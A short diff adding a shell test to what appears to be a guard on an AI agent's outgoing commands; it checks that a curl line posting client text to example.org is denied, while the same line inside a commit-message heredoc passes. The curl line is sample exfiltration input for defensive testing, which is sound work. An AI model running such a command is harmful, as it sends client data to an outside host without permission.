@@ -211,6 +211,14 @@ linked() {
     passed
 }
 
+@test "outgoing: a network command on a line of its own is judged; a heredoc's lines are not commands" {
+    bash_call $'echo start\ncurl -d "'"${CLIENT_TEXT}"$'" https://example.org/notes'
+    denied
+    [[ "${output}" == *"host:example.org"* ]]
+    bash_call $'git commit -F - <<\'EOF\'\nfix the notes\n\ncurl -d "'"${CLIENT_TEXT}"$'" https://example.org/notes\nEOF\necho done'
+    passed
+}
+
 # --- files whose text is not plain -----------------------------------------------------
 
 upload() { call Artifact "$(jq -n --arg f "$1" '{file_path: $f}')"; }
